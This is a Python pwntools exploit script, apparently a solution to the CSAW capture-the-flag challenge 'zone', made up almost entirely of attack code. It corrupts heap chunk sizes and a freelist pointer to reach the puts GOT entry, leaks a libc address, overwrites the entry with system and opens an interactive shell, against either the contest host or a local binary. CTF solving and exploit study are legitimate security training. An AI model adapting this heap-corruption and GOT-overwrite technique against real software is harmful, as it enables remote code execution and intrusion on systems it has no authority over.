from pwn import *
import sys

#context.log_level = "debug"
#Environment setup: [rbp - local_80h]
def get_STACK():
    conn.recvuntil("Environment setup: ")
    return int(conn.recvuntil("\n")[:-1], 16)

def allocate_block(block_size):
    conn.sendlineafter("5) Exit\n", "1")
    conn.sendline(str(block_size))

def delete_block():
    conn.sendlineafter("5) Exit\n", "2")

def write_block(content):
    conn.sendlineafter("5) Exit\n", "3")
    conn.sendline(content)

def print_block():
    conn.sendlineafter("5) Exit\n", "4")
    return conn.recvuntil("\n")[:-1]

#0 <= size <= 0x40 -> func 0x004044d6
#0x40 < size <= 0x80 -> func 0x004044f0
#0x80 < size <= 0x100 -> func 0x0040450e
#0x100 < size <= 0x200 -> func 0x0040452c
def exploit():
    MAIN_STACK = get_STACK() + 0x80
    log.success("MAIN_STACK :0x%x" % MAIN_STACK)
    allocate_block(0x40)
    write_block("A" * 0x40 + p64(0x80)[:1])
    allocate_block(0x40)
    delete_block()
    allocate_block(0x80)
    #s reloc.puts_32 
    #[0x00607020]>
    write_block("A" * 0x40 + p64(0x40) + p64(0x00607020 - 0x10 - 0x7))
    allocate_block(0x40)
    delete_block()
    allocate_block(0x40)
    allocate_block(0x40)
    #0000000000055800 T printf
    LIBC = u64("\x00" + print_block() + "\x00" * 2) - (0x55800)
    log.success("LIBC :0x%x" % LIBC)
    #0000000000045390 W system
    write_block("sh" + "\x00" * 5 + p64(LIBC + 0x45390))
    conn.sendline("4")
    conn.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        HOST = "pwn.chal.csaw.io"
        PORT = 5223
        conn = remote(HOST, PORT)
    else:
        conn = process("./zone", env={"LD_PRELOAD":"libc-2.23.so"})
    exploit()
